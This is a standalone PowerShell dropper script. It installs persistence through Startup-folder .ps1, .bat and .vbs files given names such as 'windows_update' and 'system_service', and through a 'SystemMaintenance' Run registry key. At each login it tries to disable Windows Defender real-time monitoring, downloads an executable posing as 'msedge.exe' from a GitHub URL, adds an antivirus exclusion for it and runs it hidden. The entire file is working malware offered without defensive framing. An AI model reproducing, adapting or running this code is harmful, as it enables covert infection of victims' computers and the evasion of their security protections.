# Simple startup approach
$downloadUrl = "https://github.com/Nxtccijo/oooow/raw/refs/heads/main/msedge.exe"
$logPath = "$env:TEMP\startup_log.txt"

"$(Get-Date) - Starting startup script setup" | Out-File $logPath

# Create a PowerShell startup script
$startupFolder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$startupPs1 = "$startupFolder\windows_update.ps1"

try {
    "$(Get-Date) - Creating startup PowerShell script" | Out-File $logPath -Append
    
    # PowerShell script content
    $psScript = @"
# Startup script for Windows Update Service
`$logFile = "$env:TEMP\startup_execution.log"
"Started execution at `$(Get-Date)" | Out-File `$logFile

# Try to disable protection first
try {
    "Attempting to disable protection" | Out-File `$logFile -Append
    Set-MpPreference -DisableRealtimeMonitoring `$true -Force -ErrorAction SilentlyContinue
    "Disabled protection" | Out-File `$logFile -Append
} catch {
    "Failed to disable protection: `$_" | Out-File `$logFile -Append
}

# Download the file
`$downloadUrl = "$downloadUrl"
`$downloadPath = "`$env:TEMP\winupdate.exe"

try {
    "Downloading file" | Out-File `$logFile -Append
    (New-Object Net.WebClient).DownloadFile(`$downloadUrl, `$downloadPath)
    
    if (Test-Path `$downloadPath) {
        "Download successful" | Out-File `$logFile -Append
        
        # Add exclusion
        try {
            "Adding exclusion" | Out-File `$logFile -Append
            Add-MpPreference -ExclusionPath `$downloadPath -ErrorAction SilentlyContinue
            "Exclusion added" | Out-File `$logFile -Append
        } catch {
            "Failed to add exclusion: `$_" | Out-File `$logFile -Append
        }
        
        # Try to run
        try {
            "Attempting to run" | Out-File `$logFile -Append
            Start-Process -FilePath `$downloadPath -ArgumentList "/silent"
            "Process started" | Out-File `$logFile -Append
        } catch {
            "Failed to run: `$_" | Out-File `$logFile -Append
            
            # Try alternative run method
            try {
                "Trying alternative run method" | Out-File `$logFile -Append
                `$startInfo = New-Object System.Diagnostics.ProcessStartInfo
                `$startInfo.FileName = `$downloadPath
                `$startInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
                [System.Diagnostics.Process]::Start(`$startInfo)
                "Alternative method used" | Out-File `$logFile -Append
            } catch {
                "Alternative method failed: `$_" | Out-File `$logFile -Append
            }
        }
    } else {
        "Download failed - file not found" | Out-File `$logFile -Append
    }
} catch {
    "Error during download: `$_" | Out-File `$logFile -Append
}

"Startup script completed at `$(Get-Date)" | Out-File `$logFile -Append
"@
    
    # Write the PowerShell script
    $psScript | Out-File -FilePath $startupPs1 -Encoding UTF8
    "$(Get-Date) - PowerShell script written to $startupPs1" | Out-File $logPath -Append
    
    # Create a .bat launcher for the PowerShell script (more reliable at startup)
    $startupBat = "$startupFolder\update.bat"
    $batContent = @"
@echo off
PowerShell -WindowStyle Hidden -ExecutionPolicy Bypass -File "$startupPs1"
"@
    
    $batContent | Out-File -FilePath $startupBat -Encoding ASCII
    "$(Get-Date) - BAT launcher written to $startupBat" | Out-File $logPath -Append
    
    # Create a VBS launcher as well (even more reliable, runs hidden)
    $startupVbs = "$startupFolder\system_service.vbs"
    $vbsContent = @"
Set objShell = CreateObject("WScript.Shell")
objShell.Run "PowerShell -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$startupPs1""", 0, False
"@
    
    $vbsContent | Out-File -FilePath $startupVbs -Encoding ASCII
    "$(Get-Date) - VBS launcher written to $startupVbs" | Out-File $logPath -Append
    
} catch {
    "$(Get-Date) - Error creating startup scripts: $_" | Out-File $logPath -Append
}

# Add registry startup entry as well
try {
    "$(Get-Date) - Adding registry startup entry" | Out-File $logPath -Append
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    Set-ItemProperty -Path $regPath -Name "SystemMaintenance" -Value "wscript.exe `"$startupVbs`"" -Force
    "$(Get-Date) - Registry entry added" | Out-File $logPath -Append
} catch {
    "$(Get-Date) - Failed to add registry entry: $_" | Out-File $logPath -Append
}

"$(Get-Date) - Setup completed. Script will run at next login." | Out-File $logPath -Append